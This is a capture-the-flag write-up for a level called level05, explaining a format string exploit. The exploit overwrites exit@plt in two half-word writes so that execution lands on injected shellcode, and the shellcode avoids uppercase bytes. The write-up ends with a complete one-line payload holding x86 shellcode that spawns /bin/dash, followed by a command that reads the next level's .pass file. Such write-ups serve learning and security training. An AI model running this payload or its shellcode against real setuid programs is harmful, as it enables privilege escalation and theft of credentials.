# Format String exploit on the stack

see source.c

## Analysis

After a quick look, we noticed where the flaw is:
the program is calling printf with a received input strings.

The difficulty of this one is obviously the call at exit right away, that means we have to modify and use the linkage table of exit 'exit@plt' and redirect it on a payload/function. But we didn't find any cool function to use so this was a payload time !

First problem: We didn't manage to jump on a address on the stack on the previous format string exploit due to the really high value of the stack and the printf maximum capacity of char printed. So we think about it and found a smart way to do it: Modify the pointer in 2 times instead of 1 ! Meaning that the highest value that we have to print and assign to a pointer would be 0xffff (65536), let's jump on that payload ! o/

### Example:
Supposing we need to rewrite the address at 0x080407e0 and set it to 0xffffd69d:
Firstly we will fill 0x080407e0 with the last 2 bytes with a first %n so:
``` 
0x080407e0: 0x0000d69d (\x9d\xd6\x00\x00)
```
Then we will fill 0x080407e0 + 2 with the last 2 bytes (here 0xffff), it will also rewrite 0x080407e0 but we don't care:
```
0x080407e2: 0x0000ffff (\xff\xff\x00\x00)
so:
0x080407e0: 0xffffd69d (\x9d\xd6\xff\xff)
```

Of course, the first 2 bytes digit must be < to the last 2 bytes on this solution, but this was the case c:

### Payload structure
Ok cool ! Then we have to think about a payload structure to make this works ! We'll do something like this:
```
[ EXIT@PTR ][4 bytes padding ][ EXIT@PTR + 2][ /bin/dash payload ][padding]%n[padding]%n"
```
`padding` must contains %p or %x and padding needed to fill the right value on %n. We'll use gdb to caculate that !

### /bin/dash payload
Another problem from the code with disassemble: the program is putting all uppercase letters in lowercase.. That means we have to build a little payload that doesn't contains any uppercase to avoid problems (because bytecode will be different, it will break our payload).

see `resources/payload.s` to see the achieved payload.

## Exploit

After a some deep problem with stack localization in/or out gdb (address weren't the same), we manage to get a good payload by analysing the pointer that we were printing, for example:

```
0xf7fcfac0 0xf7ec3af9 0xffffd6af 0xffffd6ae(nil) 0xffffffff 0xffffd734 0xf7fdb000 // tracerless payload
0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be(nil) 0xffffffff 0xffffd744 (nil) // gdb/ltrace payload
```
We can see that we haven't the same amount of printed bytes and address are 0x10 away one to another, so we have to think about all that when migrating the payload out of gdb.

Final payload (poggers):
```
(python -c "print('\xe0\x97\x04\x08aaaa\xe2\x97\x04\x08\x31\xc9\xf7\xe1\x6a\x0b\x5f\x89\xf8\x6a\x68\x68\x2f\x64\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x6a\x01\x5f\x89\xf8\xcd\x80%2993p%51830p%p%p%p%p%p%p%p%10n %10601p %n')"; echo "cat /home/users/level06/.pass") | /home/users/level05/level05
```
